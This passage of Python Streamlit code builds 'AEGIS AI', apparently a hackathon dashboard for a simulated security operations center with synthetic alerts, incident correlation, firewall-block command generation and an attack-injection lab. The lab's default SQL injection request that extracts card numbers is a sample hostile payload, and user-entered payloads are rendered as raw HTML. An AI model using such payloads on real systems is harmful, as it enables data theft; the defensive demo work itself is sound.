            st.toast("Injected: Abnormal High-Volume Data Exfiltration", icon="📦")
            st.rerun()

    st.markdown("---")
    st.markdown("### 🔍 Filter Threat Stream")
    
    severity_options = ["Low", "Medium", "High", "Critical"]
    selected_severities = st.multiselect("Severity Level", options=severity_options, default=["Medium", "High", "Critical"])
    
    min_score = st.slider("Minimum Risk Score", min_value=0, max_value=100, value=40)
    
    search_query = st.text_input("Search (IP, User, Host, Payload)", placeholder="e.g. 185.220, admin, SQL")
    
    st.markdown("---")
    st.markdown("""
        <div style="font-size:0.75rem; color:#64748b; line-height:1.4;">
            <b style="color:#94a3b8;">AEGIS AI Autonomous SOC</b><br>
            Mode: Synthetic Cyber Sandbox<br>
            Version: v2.4-Hackathon Edition<br>
            Platform: Safe / No Real Attacks
        </div>
    """, unsafe_allow_html=True)

# Filter Dataframe for UI Views
df = st.session_state.events_df
filtered_df = df[
    (df["severity"].isin(selected_severities)) &
    (df["risk_score"] >= min_score)
]

if search_query:
    q = search_query.strip().lower()
    filtered_df = filtered_df[
        filtered_df["source_ip"].str.lower().str.contains(q, na=False) |
        filtered_df["destination_ip"].str.lower().str.contains(q, na=False) |
        filtered_df["user_account"].str.lower().str.contains(q, na=False) |
        filtered_df["event_type"].str.lower().str.contains(q, na=False) |
        filtered_df["raw_payload"].str.lower().str.contains(q, na=False)
    ]

# Calculate High-Level Metrics
total_events = len(df)
suspicious_events = len(df[df["risk_score"] >= 40])
high_risk_alerts = len(df[df["severity"].isin(["High", "Critical"])])
critical_alerts = len(df[df["severity"] == "Critical"])
total_incidents = len(st.session_state.incidents)

# ==============================================================================
# 8. TOP BANNER / HEADER (FEATURE 10)
# ==============================================================================
st.markdown(f"""
    <div class="aegis-header">
        <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:1rem;">
            <div>
                <div style="display:flex; align-items:center; gap:8px;">
                    <span class="pulse-dot"></span>
                    <span style="font-size:0.78rem; font-weight:700; color:#10b981; letter-spacing:0.12em; text-transform:uppercase;">
                        AEGIS AI AUTONOMOUS DEFENSE ACTIVE
                    </span>
                    <span class="badge badge-shield">SOC TIER-1 ASSISTANT</span>
                </div>
                <h1 style="margin: 0.35rem 0 0.2rem 0; font-size: 2.1rem; font-weight: 800; color:#ffffff; letter-spacing:-0.03em;">
                    AEGIS AI <span style="color:#00f2fe; font-weight:400;">//</span> Cyber Threat Detection & Incident Response
                </h1>
                <p style="margin: 0; color: #94a3b8; font-size: 0.95rem; max-width: 820px;">
                    Real-time AI telemetry correlation, multi-stage attack detection, explainable heuristic scoring, and prescriptive human-in-the-loop mitigation playbooks.
                </p>
            </div>
            <div style="text-align:right;">
                <div style="font-family:'JetBrains Mono', monospace; font-size:1.1rem; font-weight:700; color:#38bdf8;">
                    {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} UTC
                </div>
                <div style="font-size:0.75rem; color:#64748b; margin-top:2px;">
                    Host Security Perimeter: <span style="color:#10b981; font-weight:600;">ACTIVE MONITORING</span>
                </div>
            </div>
        </div>
    </div>
""", unsafe_allow_html=True)

# ==============================================================================
# 9. KPI METRIC CARDS (FEATURE 1)
# ==============================================================================
col1, col2, col3, col4, col5 = st.columns(5)

with col1:
    st.markdown(f"""
        <div class="metric-card">
            <div class="metric-title">📊 Total Events Ingested</div>
            <div class="metric-value" style="color: #38bdf8;">{total_events:,}</div>
            <div class="metric-footer">
                <span style="color:#10b981;">● 100% Parsed</span> &nbsp;|&nbsp; Safe Synthetic Telemetry
            </div>
        </div>
    """, unsafe_allow_html=True)

with col2:
    st.markdown(f"""
        <div class="metric-card">
            <div class="metric-title">⚠️ Suspicious Events</div>
            <div class="metric-value" style="color: #fbbf24;">{suspicious_events:,}</div>
            <div class="metric-footer">
                <span style="color:#fbbf24;">{(suspicious_events/total_events*100):.1f}%</span> of total telemetry stream
            </div>
        </div>
    """, unsafe_allow_html=True)

with col3:
    st.markdown(f"""
        <div class="metric-card">
            <div class="metric-title">🚨 High-Risk Alerts</div>
            <div class="metric-value" style="color: #f97316;">{high_risk_alerts:,}</div>
            <div class="metric-footer">
                Score threshold &ge; 70 &bull; Immediate Triaged
            </div>
        </div>
    """, unsafe_allow_html=True)

with col4:
    st.markdown(f"""
        <div class="metric-card">
            <div class="metric-title">🔥 Critical Threats</div>
            <div class="metric-value" style="color: #ef4444;">{critical_alerts:,}</div>
            <div class="metric-footer">
                <span style="color:#ef4444;">Severe Action Required</span> &bull; Crown Jewels
            </div>
        </div>
    """, unsafe_allow_html=True)

with col5:
    st.markdown(f"""
        <div class="metric-card">
            <div class="metric-title">🧩 Correlated Incidents</div>
            <div class="metric-value" style="color: #c084fc;">{total_incidents}</div>
            <div class="metric-footer">
                AI Correlated Multi-Stage Campaigns
            </div>
        </div>
    """, unsafe_allow_html=True)

st.markdown("<div style='margin-bottom: 1.5rem;'></div>", unsafe_allow_html=True)

# ==============================================================================
# 10. MAIN NAVIGATION TABS (FEATURES 1 - 10)
# ==============================================================================
tab_overview, tab_alerts, tab_incidents, tab_sim_lab, tab_architecture = st.tabs([
    "📊 SOC Command Center",
    "🚨 Threat Detection & Alerts Table",
    "🧩 Incident Correlation & War Room",
    "🧪 Live Attack Injection Lab",
    "ℹ️ Project Description & Architecture"
])

# ==============================================================================
# TAB 1: SOC COMMAND CENTER (OVERVIEW CHARTS & ANALYTICS) (FEATURE 8)
# ==============================================================================
with tab_overview:
    # Row 1: Threat Velocity Timeline & Severity Distribution
    row1_col1, row1_col2 = st.columns([7, 3])
    
    with row1_col1:
        st.markdown("#### 📈 Threat Volume & Detection Velocity Over Time")
        # Prepare time series data
        df_time = df.copy()
        df_time["timestamp_dt"] = pd.to_datetime(df_time["timestamp"])
        df_time = df_time.sort_values("timestamp_dt")
        
        # Resample by 5-minute bins
        df_time.set_index("timestamp_dt", inplace=True)
        time_resampled = df_time.groupby([pd.Grouper(freq="5min"), "severity"]).size().unstack(fill_value=0).reset_index()
        
        # Ensure all severity columns exist
        for sev in ["Critical", "High", "Medium", "Low"]:
            if sev not in time_resampled.columns:
                time_resampled[sev] = 0

        fig_timeline = go.Figure()
        
        color_map = {
            "Critical": "#ef4444",
            "High": "#f97316",
            "Medium": "#f59e0b",
            "Low": "#10b981"
        }
        
        for sev in ["Low", "Medium", "High", "Critical"]:
            if sev in time_resampled.columns:
                fig_timeline.add_trace(go.Scatter(
                    x=time_resampled["timestamp_dt"],
                    y=time_resampled[sev],
                    name=sev,
                    mode="lines+markers",
                    stackgroup="one" if sev != "Critical" else None,
                    line=dict(width=2.5, color=color_map[sev]),
                    marker=dict(size=4)
                ))

        fig_timeline.update_layout(
            paper_bgcolor="rgba(11, 21, 43, 0.7)",
            plot_bgcolor="rgba(11, 21, 43, 0.7)",
            font=dict(color="#94a3b8", family="Inter"),
            margin=dict(l=40, r=20, t=20, b=40),
            height=320,
            hovermode="x unified",
            legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1),
            xaxis=dict(gridcolor="#1e2e5a", showgrid=True),
            yaxis=dict(gridcolor="#1e2e5a", showgrid=True, title="Event Count")
        )
        st.plotly_chart(fig_timeline, use_container_width=True)

    with row1_col2:
        st.markdown("#### 🎯 Alert Severity Distribution")
        sev_counts = df["severity"].value_counts().reset_index()
        sev_counts.columns = ["Severity", "Count"]

        fig_donut = px.pie(
            sev_counts,
            values="Count",
            names="Severity",
            hole=0.62,
            color="Severity",
            color_discrete_map=color_map
        )
        fig_donut.update_layout(
            paper_bgcolor="rgba(11, 21, 43, 0.7)",
            plot_bgcolor="rgba(11, 21, 43, 0.7)",
            font=dict(color="#94a3b8", family="Inter"),
            margin=dict(l=20, r=20, t=20, b=20),
            height=320,
            showlegend=True,
            legend=dict(orientation="h", yanchor="bottom", y=-0.15, xanchor="center", x=0.5),
            annotations=[dict(text=f"<b>{len(df)}</b><br><span style='font-size:10px;'>ALERTS</span>", x=0.5, y=0.5, font_size=16, font_color="#f1f5f9", showarrow=False)]
        )
        st.plotly_chart(fig_donut, use_container_width=True)

    # Row 2: Top Attacker IPs, Target Ports & MITRE ATT&CK Tactics
    row2_col1, row2_col2, row2_col3 = st.columns(3)

    with row2_col1:
        st.markdown("#### 🏴‍☠️ Top Attacking Source IPs")
        threat_only = df[df["risk_score"] >= 40]
        top_ips = threat_only["source_ip"].value_counts().head(6).reset_index()
        top_ips.columns = ["Source IP", "Alert Count"]

        fig_ips = px.bar(
            top_ips,
            x="Alert Count",
            y="Source IP",
            orientation="h",
            color="Alert Count",
            color_continuous_scale=["#3b82f6", "#ef4444"]
        )
        fig_ips.update_layout(
            paper_bgcolor="rgba(11, 21, 43, 0.7)",
            plot_bgcolor="rgba(11, 21, 43, 0.7)",
            font=dict(color="#94a3b8", family="Inter"),
            margin=dict(l=20, r=20, t=10, b=20),
            height=260,
            coloraxis_showscale=False,
            xaxis=dict(gridcolor="#1e2e5a", showgrid=True),
            yaxis=dict(categoryorder="total ascending")
        )
        st.plotly_chart(fig_ips, use_container_width=True)

    with row2_col2:
        st.markdown("#### 🎯 Targeted Ports & Services")
        port_counts = threat_only["destination_port"].astype(str).value_counts().head(6).reset_index()
        port_counts.columns = ["Port", "Probe Count"]

        fig_ports = px.bar(
            port_counts,
            x="Port",
            y="Probe Count",
            color="Probe Count",
            color_continuous_scale=["#00f2fe", "#f97316"]
        )
        fig_ports.update_layout(
            paper_bgcolor="rgba(11, 21, 43, 0.7)",
            plot_bgcolor="rgba(11, 21, 43, 0.7)",
            font=dict(color="#94a3b8", family="Inter"),
            margin=dict(l=20, r=20, t=10, b=20),
            height=260,
            coloraxis_showscale=False,
            xaxis=dict(gridcolor="#1e2e5a"),
            yaxis=dict(gridcolor="#1e2e5a", showgrid=True)
        )
        st.plotly_chart(fig_ports, use_container_width=True)

    with row2_col3:
        st.markdown("#### ⚔️ MITRE ATT&CK Tactics")
        tactic_counts = df[df["risk_score"] >= 40]["mitre_tactic"].value_counts().reset_index()
        tactic_counts.columns = ["Tactic", "Count"]

        fig_mitre = px.pie(
            tactic_counts,
            values="Count",
            names="Tactic",
            color_discrete_sequence=["#6366f1", "#ec4899", "#8b5cf6", "#f97316", "#06b6d4"]
        )
        fig_mitre.update_layout(
            paper_bgcolor="rgba(11, 21, 43, 0.7)",
            plot_bgcolor="rgba(11, 21, 43, 0.7)",
            font=dict(color="#94a3b8", family="Inter"),
            margin=dict(l=20, r=20, t=10, b=20),
            height=260,
            showlegend=True,
            legend=dict(orientation="v", y=0.5)
        )
        st.plotly_chart(fig_mitre, use_container_width=True)

# ==============================================================================
# TAB 2: THREAT DETECTION & ALERTS TABLE (FEATURES 3, 4, 6, 7, 8)
# ==============================================================================
with tab_alerts:
    st.markdown("### 🚨 Live Threat Detection Feed")
    st.caption(f"Displaying {len(filtered_df)} of {len(df)} telemetry events matching current filter parameters.")

    # Table formatting
    display_df = filtered_df[[
        "event_id", "timestamp", "severity", "risk_score", "source_ip", 
        "geo_country", "destination_ip", "destination_port", "event_type", "rule_code"
    ]].copy()

    # Colorize severity badge function
    def format_severity(sev):
        if sev == "Critical":
            return f'<span class="badge badge-critical">CRITICAL</span>'
        elif sev == "High":
            return f'<span class="badge badge-high">HIGH</span>'
        elif sev == "Medium":
            return f'<span class="badge badge-medium">MEDIUM</span>'
        return f'<span class="badge badge-low">LOW</span>'

    # Interactive Selectbox to inspect individual alert details
    st.dataframe(
        display_df,
        use_container_width=True,
        hide_index=True,
        column_config={
            "event_id": st.column_config.TextColumn("Event ID", width="small"),
            "timestamp": st.column_config.TextColumn("Timestamp", width="medium"),
            "severity": st.column_config.TextColumn("Severity", width="small"),
            "risk_score": st.column_config.ProgressColumn("Risk Score", format="%d", min_value=0, max_value=100, width="small"),
            "source_ip": st.column_config.TextColumn("Source IP", width="medium"),
            "geo_country": st.column_config.TextColumn("Origin", width="small"),
            "destination_ip": st.column_config.TextColumn("Target IP", width="medium"),
            "destination_port": st.column_config.NumberColumn("Port", format="%d", width="small"),
            "event_type": st.column_config.TextColumn("Detected Threat Vector", width="large"),
            "rule_code": st.column_config.TextColumn("Triggered Rule", width="medium"),
        }
    )

    st.markdown("---")
    st.markdown("### 🔍 Deep Dive Event Inspector & Explainable AI (XAI)")
    
    # Event selector for deep dive
    selected_event_id = st.selectbox(
        "Select an Event ID to inspect forensic evidence, AI rationale, and defensive actions:",
        options=filtered_df["event_id"].tolist() if not filtered_df.empty else ["No matching events"],
        index=0
    )

    if selected_event_id and selected_event_id != "No matching events":
        selected_event = filtered_df[filtered_df["event_id"] == selected_event_id].iloc[0]
        
        detail_col1, detail_col2 = st.columns([6, 4])
        
        with detail_col1:
            st.markdown(f"""
                <div class="cyber-box">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.75rem;">
                        <span style="font-family:'JetBrains Mono', monospace; font-size:1.1rem; font-weight:700; color:#38bdf8;">
                            {selected_event['event_id']} — {selected_event['event_type']}
                        </span>
                        {format_severity(selected_event['severity'])}
                    </div>
                    
                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:0.5rem; font-size:0.85rem; margin-bottom:1rem;">
                        <div><b style="color:#94a3b8;">Source:</b> <code>{selected_event['source_ip']}</code> ({selected_event['geo_country']})</div>
                        <div><b style="color:#94a3b8;">Target Host:</b> <code>{selected_event['destination_ip']}:{selected_event['destination_port']}</code></div>
                        <div><b style="color:#94a3b8;">Timestamp:</b> {selected_event['timestamp']}</div>
                        <div><b style="color:#94a3b8;">Account:</b> <code>{selected_event['user_account']}</code></div>
                        <div><b style="color:#94a3b8;">Protocol:</b> {selected_event['protocol']}</div>
                        <div><b style="color:#94a3b8;">Bytes Tx:</b> {selected_event['bytes_transferred']:,} bytes</div>
                    </div>

                    <div style="font-weight:700; color:#00f2fe; font-size:0.85rem; margin-bottom:0.3rem;">
                        📜 Raw Telemetry Packet / Log Snippet:
                    </div>
                    <div class="cyber-code">{selected_event['raw_payload']}</div>
                </div>
            """, unsafe_allow_html=True)

            # AI Explainability Section (Feature 6)
            st.markdown(f"""
                <div class="cyber-box" style="border-left: 3px solid #3b82f6;">
                    <div style="font-weight:700; color:#60a5fa; font-size:0.92rem; margin-bottom:0.5rem; display:flex; align-items:center; gap:6px;">
                        🤖 AI Detection Rationale (Why was this flagged?)
                    </div>
                    <p style="font-size:0.88rem; color:#f1f5f9; line-height:1.5;">
                        {selected_event['explanation_summary']}
                    </p>
                    <div style="margin-top:0.6rem;">
                        <ul style="margin:0; padding-left:1.2rem; font-size:0.84rem; color:#94a3b8;">
                            {''.join(f'<li style="margin-bottom:4px;">{b}</li>' for b in selected_event['explanation_bullets'])}
                        </ul>
                    </div>
                    <div style="margin-top:0.8rem; font-size:0.8rem; color:#64748b; font-family:'JetBrains Mono', monospace;">
                        Mapped Framework: <b>{selected_event['mitre_tactic']}</b> &bull; <code>{selected_event['mitre_technique']}</code>
                    </div>
                </div>
            """, unsafe_allow_html=True)

        with detail_col2:
            # Defensive Actions Section (Feature 7)
            st.markdown(f"""
                <div class="cyber-box" style="border-left: 3px solid #10b981;">
                    <div style="font-weight:700; color:#34d399; font-size:0.92rem; margin-bottom:0.5rem;">
                        🛡️ Recommended Human-in-the-Loop Actions
                    </div>
                    <p style="font-size:0.82rem; color:#94a3b8;">
                        Prescriptive containment actions calculated for SOC analyst validation:
                    </p>
                    <div style="margin-bottom:1rem;">
                        <ul style="margin:0; padding-left:1.1rem; font-size:0.84rem; color:#f1f5f9;">
                            {''.join(f'<li style="margin-bottom:6px;">{act}</li>' for act in selected_event['recommended_actions'])}
                        </ul>
                    </div>
                </div>
            """, unsafe_allow_html=True)

            # Interactive Containment Execution Simulator
            st.markdown("#### ⚡ Containment Action Simulator")
            act_col1, act_col2 = st.columns(2)
            
            with act_col1:
                if st.button(f"🚫 Block IP {selected_event['source_ip']}", use_container_width=True):
                    st.session_state.containment_log.append({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "action": f"Perimeter Drop Rule Applied (iptables / AWS WAF)",
                        "target": selected_event['source_ip'],
                        "status": "ENFORCED"
                    })
                    st.toast(f"Firewall block applied to {selected_event['source_ip']}!", icon="🛡️")

            with act_col2:
                if st.button(f"🔒 Quarantine Host {selected_event['destination_ip']}", use_container_width=True):
                    st.session_state.containment_log.append({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "action": f"EDR Network Isolation Activated",
                        "target": selected_event['destination_ip'],
                        "status": "ISOLATED"
                    })
                    st.toast(f"Isolated asset {selected_event['destination_ip']} from subnet!", icon="🔒")

            # Copyable CLI Firewall command
            st.markdown("<div style='font-size:0.75rem; color:#64748b; margin-top:0.8rem;'>Automated Rule Script Generator:</div>", unsafe_allow_html=True)
            firewall_cli = f"iptables -I INPUT -s {selected_event['source_ip']} -j DROP\nnetsh advfirewall firewall add rule name=\"AEGIS_BLOCK\" dir=in action=block remoteip={selected_event['source_ip']}"
            st.code(firewall_cli, language="bash")

# ==============================================================================
# TAB 3: INCIDENT CORRELATION & WAR ROOM (FEATURE 5, 7, 9)
# ==============================================================================
with tab_incidents:
    st.markdown("### 🧩 Correlated Security Incidents (Multi-Alert Clusters)")
    st.markdown("""
        AEGIS AI's graph correlation engine aggregates disparate security alerts into 
        cohesive attack campaigns based on shared threat actor infrastructure, targeted assets, and time delta.
    """)

    if not st.session_state.incidents:
        st.info("No multi-stage incidents currently detected. You can inject an attack scenario from the sidebar.")
    else:
        # Display incident selection cards
        for inc in st.session_state.incidents:
            sev_badge = format_severity(inc['severity'])
            
            with st.expander(f"📁 {inc['incident_id']} — {inc['title']} ({inc['event_count']} Correlated Alerts)", expanded=(inc['severity'] in ["Critical", "High"])):
                inc_col1, inc_col2 = st.columns([7, 3])
                
                with inc_col1:
                    st.markdown(f"""
                        <div style="font-size:0.95rem; margin-bottom:0.75rem; color:#f1f5f9;">
                            <b>Incident Summary:</b> {inc['narrative']}
                        </div>
                    """, unsafe_allow_html=True)
                    
                    st.markdown(f"""
                        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:0.6rem; font-size:0.84rem; margin-bottom:1rem; background-color:#080f24; padding:0.75rem; border-radius:8px; border:1px solid #1a294d;">
                            <div><b style="color:#94a3b8;">Primary Attacker:</b><br><code>{inc['attacker_ip']}</code> ({inc['origin_country']})</div>
                            <div><b style="color:#94a3b8;">Impacted Assets:</b><br>{', '.join(inc['impacted_assets'])}</div>
                            <div><b style="color:#94a3b8;">Peak Threat Score:</b><br><span style="color:#ef4444; font-weight:700;">{inc['peak_risk_score']}/100</span></div>
                        </div>
                    """, unsafe_allow_html=True)

                    st.markdown("<b>Correlated MITRE Tactics Observed in Campaign:</b>", unsafe_allow_html=True)
                    tactic_badges = " ".join([f"<span class='badge badge-shield'>{tac}</span>" for tac in inc['tactics']])
                    st.markdown(f"<div style='margin-bottom:0.8rem;'>{tactic_badges}</div>", unsafe_allow_html=True)

                    # List linked alert IDs
                    st.markdown("<b>Correlated Telemetry Events in Chain:</b>", unsafe_allow_html=True)
                    linked_events = df[df["event_id"].isin(inc["event_ids"])][["event_id", "timestamp", "event_type", "destination_port", "risk_score"]]
                    st.dataframe(linked_events, use_container_width=True, hide_index=True)

                with inc_col2:
                    st.markdown(f"""
                        <div class="cyber-box" style="border-top:3px solid #f59e0b;">
                            <div style="font-weight:700; color:#fbbf24; font-size:0.9rem; margin-bottom:0.5rem;">
                                📋 Incident Response Playbook
                            </div>
                            <div style="font-size:0.82rem; margin-bottom:0.75rem;">
                                Recommended SOC actions for human approval:
                            </div>
                            <ol style="padding-left:1.1rem; margin:0; font-size:0.8rem; color:#e2e8f0;">
                                {''.join(f'<li style="margin-bottom:6px;">{step}</li>' for step in inc['recommended_playbook'])}
                            </ol>
                        </div>
                    """, unsafe_allow_html=True)

                    # Action buttons
                    if st.button(f"🛡️ Execute Complete Containment ({inc['incident_id']})", key=f"btn_contain_{inc['incident_id']}", use_container_width=True):
                        st.session_state.containment_log.append({
                            "timestamp": datetime.now().strftime("%H:%M:%S"),
                            "action": f"Executed Full Containment Protocol for {inc['incident_id']}",
                            "target": inc['attacker_ip'],
                            "status": "CONTAINED"
                        })
                        st.success(f"Containment playbooks executed for {inc['incident_id']}!")

    # Live Containment Audit Log
    st.markdown("---")
    st.markdown("### 📜 Autonomous SOC Mitigation & Audit Trail")
    st.caption("Real-time ledger of actions taken by human operators or autonomous containment playbooks.")
    
    audit_df = pd.DataFrame(st.session_state.containment_log)
    st.dataframe(
        audit_df,
        use_container_width=True,
        hide_index=True,
        column_config={
            "timestamp": st.column_config.TextColumn("Time (UTC)", width="small"),
            "action": st.column_config.TextColumn("Action Taken", width="large"),
            "target": st.column_config.TextColumn("Target Entity", width="medium"),
            "status": st.column_config.TextColumn("Execution Status", width="small")
        }
    )

# ==============================================================================
# TAB 4: LIVE ATTACK INJECTION LAB (FEATURE 10)
# ==============================================================================
with tab_sim_lab:
    st.markdown("### 🧪 Live Cyber Attack Injection Lab")
    st.markdown("""
        This interactive testbed allows hackathon judges and evaluators to inject synthetic cyber threats into AEGIS AI in real-time.
        Watch the detection engine ingest, compute threat risk scores, trigger rules, and generate mitigation plans instantly!
    """)

    sim_col1, sim_col2 = st.columns([5, 5])
    
    with sim_col1:
        st.markdown("#### 1. Select Threat Scenario & Parameters")
        chosen_scenario = st.selectbox(
            "Attack Vector:",
            [
                "Distributed SSH/RDP Credential Stuffing Storm",
                "Web Application SQL Injection (SQLi) Extraction",
                "Stealth SYN Network Service & Port Reconnaissance",
                "Impossible Travel Geolocation Velocity Anomaly",
                "High-Volume Sensitive Data Exfiltration (DNS Tunnel)"
            ]
        )
        
        sim_src_ip = st.text_input("Adversary Source IP:", value="185.220.101.5")
        sim_target = st.selectbox("Target Infrastructure:", list(ASSETS.keys()), format_func=lambda k: f"{k} ({ASSETS[k]['name']})")
        
        if "SQL" in chosen_scenario:
            default_payload = "GET /api/v1/payments?id=1%20UNION%20SELECT%20cc_num,cvv,exp%20FROM%20vault-- HTTP/1.1"
        elif "Stuffing" in chosen_scenario:
            default_payload = f"AUTH_FAIL: pam_unix(sshd:auth): authentication failure; user=root rhost={sim_src_ip}"
        elif "Reconnaissance" in chosen_scenario:
            default_payload = f"TCP_SYN: Stealth half-open sweep across sensitive ports [21, 22, 445, 1433, 3389]"
        elif "Impossible" in chosen_scenario:
            default_payload = f"IDENTITY_ALERT: Account 'sarah.connors' logged in from Saint Petersburg (185.176.43.9) 12 mins after login in London"
        else:
            default_payload = f"ANOMALY_TRAFFIC: 285 MB outbound data stream transmitted to {sim_src_ip}:8443"

        sim_payload = st.text_area("Raw Threat Payload / Signature:", value=default_payload, height=90)
        
        inject_btn = st.button("🚀 Fire Threat Vector into AEGIS AI", use_container_width=True)

    with sim_col2:
        st.markdown("#### 2. Real-Time AEGIS AI Detection Output")
        
        if inject_btn:
            # Construct synthetic event
            injected_event = {
                "event_id": f"EVT-INJECT-{random.randint(100, 999)}",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": sim_src_ip,
                "geo_country": "Simulated External",
                "destination_ip": sim_target,
                "destination_port": 443 if "SQL" in chosen_scenario else (22 if "SSH" in chosen_scenario else 8443),
                "protocol": "HTTPS" if "SQL" in chosen_scenario else "TCP",
                "user_account": "root" if "Stuffing" in chosen_scenario else "sim_user",
                "event_type": chosen_scenario,
                "raw_payload": sim_payload,
                "bytes_transferred": 250_000_000 if "Exfiltration" in chosen_scenario else 1500,
                "category": "web_exploit" if "SQL" in chosen_scenario else ("brute_force" if "Stuffing" in chosen_scenario else "data_exfil")
            }
            
            # Analyze immediately
            analysis = AegisDetectionEngine.analyze_event(injected_event, df)
            
            # Append to session state
            full_injected = {**injected_event, **analysis}
            st.session_state.events_df = pd.concat([pd.DataFrame([full_injected]), st.session_state.events_df], ignore_index=True)
            st.session_state.incidents = correlate_incidents(st.session_state.events_df)
            
            st.markdown(f"""
                <div class="cyber-box" style="border:1px solid #00f2fe; box-shadow:0 0 20px rgba(0, 242, 254, 0.25);">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span style="font-weight:700; color:#00f2fe;">THREAT INTERCEPTED BY ENGINE</span>
                        {format_severity(analysis['severity'])}
                    </div>
                    <div style="font-size:2.2rem; font-weight:800; font-family:'JetBrains Mono', monospace; color:#f87171; margin:0.4rem 0;">
                        Risk Score: {analysis['risk_score']}/100
                    </div>
                    <div style="font-size:0.85rem; margin-bottom:0.6rem;">
                        <b>Matched Rule:</b> <code>{analysis['rule_code']}</code><br>
                        <b>ATT&CK Matrix:</b> <code>{analysis['mitre_tactic']} // {analysis['mitre_technique']}</code>
                    </div>
                    <div style="font-size:0.84rem; color:#f1f5f9; background:#040916; padding:0.6rem; border-radius:6px; margin-bottom:0.6rem;">
                        <b>AI Rationale:</b> {analysis['explanation_summary']}
                    </div>
                    <div style="font-size:0.8rem; color:#34d399;">
                        <b>Containment Recommendation:</b> {analysis['recommended_actions'][0] if analysis['recommended_actions'] else 'None'}
                    </div>
                </div>
            """, unsafe_allow_html=True)
            st.success("Interception logged! Check the Threat Detection Table and Incident War Room to view updated correlation.")
        else:
            st.info("Configure the threat vector parameters on the left and click 'Fire Threat Vector' to simulate an active attack.")

# ==============================================================================
# TAB 5: PROJECT DESCRIPTION & ARCHITECTURE (FEATURE 9, 10)
# ==============================================================================
with tab_architecture:
    st.markdown("### 🛡️ AEGIS AI — Hackathon Project Overview")
    
    col_arch1, col_arch2 = st.columns([6, 4])
    
    with col_arch1:
        st.markdown("""
            #### 💡 Problem Statement
            Modern Security Operations Centers (SOCs) are overwhelmed by alert fatigue:
            - **Excessive Noise**: Analysts encounter thousands of unprioritized log alerts daily.
            - **Disconnected Signals**: Traditional rule engines flag isolated log lines without correlating full multi-stage kill chains.
            - **Lack of Explainability**: Legacy black-box machine learning systems assign arbitrary anomaly scores without telling analysts *why* or *what to do*.
            - **Slow TTR (Time to Respond)**: Manual containment decisions leave a wide breach window.

            #### ⚡ The AEGIS AI Solution
            **AEGIS AI** combines deterministic heuristic rule detection with graph correlation, asset-criticality weighting, 
            and explainable AI (XAI) to transform raw telemetry into prescriptive, human-in-the-loop defense playbooks.
        """)

        st.markdown("#### 🏗️ Architecture Pipeline")
        st.markdown("""
```
 +-----------------------------------------------------------------------------------+
 |                             AEGIS AI SOC PIPELINE                                 |
 +-----------------------------------------------------------------------------------+
 
   [ 1. Ingestion Layer ]        -->  Safe, Structured Telemetry (Auth, Net, Web, DNS)
             │
             ▼
   [ 2. Heuristic Rule Engine ]   -->  Deterministic Signature & Velocity Evaluation
             │                        (R101 Brute Force, R102 Port Scan, R103 SQLi, etc.)
             ▼
   [ 3. Asset & Context Matrix ] -->  Crown Jewel & Criticality Scoring Boost
             │                        (Domain Controllers & Payment DBs weighted)
             ▼
   [ 4. AI Explainability (XAI) ] -->  Generates Human-Readable "Why Flagged" Breakdown
             │                        + MITRE ATT&CK Tactic & Technique Mapping
             ▼
   [ 5. Incident Correlator ]    -->  Graph Clustering across Attacker IP & Asset Chains
             │                        (Turns 50 alerts into 1 cohesive incident)
             ▼
   [ 6. Containment Playbooks ]   -->  Prescriptive Human-in-the-Loop Mitigation Commands
                                      (Perimeter Drop, EDR Host Isolation, MFA Reset)
```
        """)

    with col_arch2:
        st.markdown("""
            <div class="cyber-box" style="border-top: 3px solid #00f2fe;">
                <div style="font-weight:700; color:#00f2fe; font-size:1rem; margin-bottom:0.75rem;">
                    🏆 Hackathon Evaluation Highlights
                </div>
                <div style="font-size:0.85rem; line-height:1.6; color:#cbd5e1;">
                    <b>1. 100% Safe & Offline:</b> Runs entirely with synthetic data. No real systems scanned or attacked.<br><br>
                    <b>2. Explainable AI:</b> Every alert provides human-readable explanations instead of uninterpretable scores.<br><br>
                    <b>3. Incident Correlation:</b> Reduces alert fatigue by grouping alerts into unified multi-stage campaigns.<br><br>
                    <b>4. Prescriptive Playbooks:</b> Provides ready-to-run mitigation commands (iptables, netsh, EDR commands).<br><br>
                    <b>5. Native Dark Cyber UI:</b> Designed with a dark navy-blue SOC aesthetic suitable for live hackathon presentations.
                </div>
            </div>
        """, unsafe_allow_html=True)

        st.markdown("#### 📄 Export Official Incident Report")
        st.caption("Generate a downloadable markdown brief for SOC leadership and auditors:")
        
        # Incident brief generator
        report_text = f"""# AEGIS AI — CYBER THREAT INCIDENT REPORT
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
Status: ACTIVE AUTONOMOUS DEFENSE

## Executive Summary
- Total Telemetry Records Analyzed: {len(df)}
- Suspicious Events Flagged: {suspicious_events}
- High & Critical Severity Alerts: {high_risk_alerts}
- Active Correlated Attack Incidents: {len(st.session_state.incidents)}

## Correlated Incidents Summary
"""
        for inc in st.session_state.incidents:
            report_text += f"\n### [{inc['incident_id']}] {inc['title']}\n"
            report_text += f"- Severity: {inc['severity']} (Peak Risk Score: {inc['peak_risk_score']}/100)\n"
            report_text += f"- Attacker IP: {inc['attacker_ip']} ({inc['origin_country']})\n"
            report_text += f"- Impacted Assets: {', '.join(inc['impacted_assets'])}\n"
            report_text += f"- Narrative: {inc['narrative']}\n"
            report_text += f"- Recommended Actions:\n"
            for act in inc['recommended_playbook']:
                report_text += f"    * {act}\n"

        st.download_button(
            label="📥 Download Incident Brief (.md)",
            data=report_text,
            file_name=f"AEGIS_AI_Incident_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md",
            mime="text/markdown",
            use_container_width=True
        )

# ==============================================================================
# FOOTER
# ==============================================================================
st.markdown("---")
st.markdown("""
    <div style="display:flex; justify-content:space-between; align-items:center; font-size:0.75rem; color:#64748b; padding-bottom:1rem;">
        <div><b>AEGIS AI</b> &bull; AI-Powered Cyber Threat Detection & Incident Response Platform</div>
